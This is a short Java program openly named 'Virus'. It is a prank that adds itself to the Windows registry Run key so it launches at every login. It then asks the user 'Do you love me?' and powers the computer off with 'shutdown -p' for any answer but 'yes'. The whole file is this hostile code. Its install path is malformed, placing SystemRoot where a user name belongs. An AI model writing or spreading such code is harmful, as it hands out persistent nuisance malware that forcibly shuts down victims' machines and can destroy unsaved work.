package virus;

import java.io.IOException;

import javax.swing.JOptionPane;

public class Virus {
	
    private final static String systemRoot = System.getenv("SystemRoot");
	private final static String name = "Virus";
	private final static String address = "C:\\Users\\" + systemRoot + "\\Downloads\\Virus.jar";
	private final static String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + name + " /t REG_SZ /d \"" + address;
	
	public static void main(String[] args) {
		try {
			execute();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private static void execute() throws IOException {
		Runtime.getRuntime().exec(command);
		String answer = JOptionPane.showInputDialog(null, "Do you love me?");
		if (answer.equals("yes")) {
			JOptionPane.showMessageDialog(null, "i love you too =)");
		} else {
			JOptionPane.showMessageDialog(null, "that's sad");
			Runtime.getRuntime().exec("shutdown -p");
		}
	}
}
